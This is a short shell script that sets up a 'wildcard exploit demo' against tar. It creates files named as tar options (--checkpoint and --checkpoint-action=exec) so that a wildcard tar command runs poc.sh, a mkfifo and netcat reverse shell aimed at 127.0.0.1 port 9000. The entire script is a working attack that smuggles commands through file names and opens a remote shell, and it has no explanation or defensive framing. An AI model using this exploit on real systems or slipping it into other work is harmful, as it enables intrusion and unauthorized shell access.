#!/usr/bin/sh

printf "\n##### Create wildcard exploit demo #####\n\n"
mkdir demo
cd demo
touch -- --checkpoint=1
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f' > poc.sh
chmod +x poc.sh
touch -- "--checkpoint-action=exec=sh poc.sh"
